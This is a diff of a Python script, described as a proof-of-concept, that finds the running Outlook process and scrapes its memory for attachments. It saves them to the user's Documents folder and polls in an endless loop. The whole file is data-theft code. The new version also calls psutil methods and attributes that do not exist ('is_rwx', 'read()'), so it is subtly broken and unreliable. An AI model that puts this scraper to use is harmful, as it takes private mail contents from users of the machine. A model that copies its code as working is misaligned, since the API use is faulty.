@@ -1,11 +1,12 @@
 import os
 import psutil
-import win32api
 import win32com.client
+import win32api
 import win32process
 import win32com
 import win32con
 from magic import Magic
+import time
 
 # objective: proof-of-concept of a possible vulnerability in a Microsoft Outlook add-in which saves attachments to a byte-array, allowing an attacker to extract them from memory.
 
@@ -28,38 +29,48 @@ def check_for_outlook():
             if proc.name().lower() == 'outlook.exe':
                 pid = proc.pid
                 read_process(pid)
-                print("Reading process")
+                
         except (psutil.AccessDenied, psutil.NoSuchProcess):
             print("OK, not reading process")
             pass
 
+
 def read_process(pid):
-    handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
-    base_address = 0
-    length = 0
-    while True:
-        try:
-            mbi = win32process.VirtualQueryEx(handle, base_address)
-            base_address += mbi.RegionSize
-            if (mbi.State == win32con.MEM_COMMIT) and (mbi.Protect == win32con.PAGE_READWRITE):
-                data = win32process.ReadProcessMemory(handle, mbi.BaseAddress, mbi.RegionSize)
-                try:
-                    with open(os.path.expandvars(f"%USERPROFILE\\Documents\\{pid}.bin"), "wb") as ext_file:
-                        magic_number = Magic()
-                        file_type = magic_number.from_buffer(data[:1024])
-                        for ext, magic_nums in file_exts.items():
-                            if file_type in magic_nums:
-                                output_file_name = f"{pid}.{ext}"
-                                with open(output_file_name, "wb") as export_file:
-                                    export_file.write(data)
-                                print(f"Extraction successful: {output_file_name}")
-                                break
+    # Get the process handle
+    try:
+        process = psutil.Process(pid)
+        handle = process.as_dict(attrs=['pid', 'name', 'ppid', 'status', 'username'])['pid']
+    except psutil.NoSuchProcess:
+        print(f'Process {pid} not found')
+        return
+
+    # Iterate over the memory regions to find the Outlook data
+    for region in process.memory_maps():
+        if region.is_rwx:
+            try:
+                data = region.read()
+            except (psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+
+            # It checks if the data is an Office file and saves it in the Documents folder. I intend to open a Save As... window soon.
+            magic_number = Magic()
+            file_type = magic_number.from_buffer(data[:1024])
+            for ext, magic_nums in file_exts.items():
+                if file_type in magic_nums:
+                    output_file_name = f"{pid}.{ext}"
+                    with open(os.path.expandvars(f"%USERPROFILE\\Documents\\{output_file_name}"), "wb") as export_file:
+                        export_file.write(data)
+                    print(f"Extraction successful: {output_file_name}")
+                    break
 
 
-                except Exception as e:
-                    print("Couldn't read byte-array:", e)
-        except:
-            break
+def main():
+    check_for_memory_transaction = False
+    while not check_for_memory_transaction:
+        check_for_outlook()
+        time.sleep(10)
+    time.sleep(10000)
 
-check_for_outlook()
- 
+
+if __name__ == "__main__":
+    main()
